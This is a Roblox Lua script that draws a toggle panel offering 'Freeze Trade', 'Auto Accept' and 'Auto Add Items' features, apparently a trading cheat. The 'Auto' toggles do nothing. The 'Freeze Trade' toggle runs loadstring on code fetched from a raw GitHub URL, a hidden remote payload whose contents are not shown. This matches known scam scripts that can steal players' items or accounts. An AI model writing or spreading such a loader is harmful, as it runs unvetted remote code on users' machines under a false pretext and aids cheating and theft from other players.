local UserInputService = game:GetService("UserInputService")

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UIStroke = Instance.new("UIStroke")
local UICorner = Instance.new("UICorner")

-- Parent GUI to Player's UI
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Frame Properties (Main Container)
Frame.Size = UDim2.new(0, 250, 0, 150)
Frame.Position = UDim2.new(0.5, -125, 0.5, -75)
Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

-- Border Stroke
UIStroke.Parent = Frame
UIStroke.Thickness = 2
UIStroke.Color = Color3.fromRGB(60, 60, 60)

-- Rounded Corners
UICorner.CornerRadius = UDim.new(0, 10)
UICorner.Parent = Frame

-- Function to Create Sliding Toggle Switches
local function createToggle(name, position, action)
    local ToggleFrame = Instance.new("Frame")
    local ToggleText = Instance.new("TextLabel")
    local ToggleButton = Instance.new("Frame")
    local ToggleSlider = Instance.new("Frame")
    local ToggleCorner = Instance.new("UICorner")
    local SliderCorner = Instance.new("UICorner")

    -- Toggle Frame
    ToggleFrame.Size = UDim2.new(0, 230, 0, 40)
    ToggleFrame.Position = position
    ToggleFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    ToggleFrame.Parent = Frame

    -- Toggle Text
    ToggleText.Size = UDim2.new(0, 150, 1, 0)
    ToggleText.Position = UDim2.new(0, 10, 0, 0)
    ToggleText.Text = name
    ToggleText.Font = Enum.Font.Gotham
    ToggleText.TextSize = 14
    ToggleText.TextColor3 = Color3.fromRGB(255, 255, 255)
    ToggleText.BackgroundTransparency = 1
    ToggleText.Parent = ToggleFrame

    -- Toggle Background (Switch Track)
    ToggleButton.Size = UDim2.new(0, 40, 0, 20)
    ToggleButton.Position = UDim2.new(1, -50, 0.5, -10)
    ToggleButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    ToggleButton.Parent = ToggleFrame

    -- Rounded Toggle Track
    ToggleCorner.CornerRadius = UDim.new(1, 0)
    ToggleCorner.Parent = ToggleButton

    -- Toggle Slider (Movable Circle)
    ToggleSlider.Size = UDim2.new(0, 18, 0, 18)
    ToggleSlider.Position = UDim2.new(0, 2, 0, 1)
    ToggleSlider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ToggleSlider.Parent = ToggleButton

    -- Rounded Slider
    SliderCorner.CornerRadius = UDim.new(1, 0)
    SliderCorner.Parent = ToggleSlider

    -- Toggle Functionality
    local isActive = false

    ToggleButton.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            isActive = not isActive

            if isActive then
                ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
                ToggleSlider:TweenPosition(UDim2.new(0, 20, 0, 1), "Out", "Quad", 0.2, true)
                if action then action(true) end
            else
                ToggleButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
                ToggleSlider:TweenPosition(UDim2.new(0, 2, 0, 1), "Out", "Quad", 0.2, true)
                if action then action(false) end
            end
        end
    end)
end

-- Creating the Toggles
createToggle("Freeze Trade", UDim2.new(0, 10, 0, 10), function(state)
    if state then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/realarceusx/realarceusx/refs/heads/main/kil"))()
    end
end)

createToggle("Auto Accept", UDim2.new(0, 10, 0, 55), nil)
createToggle("Auto Add Items", UDim2.new(0, 10, 0, 100), nil)
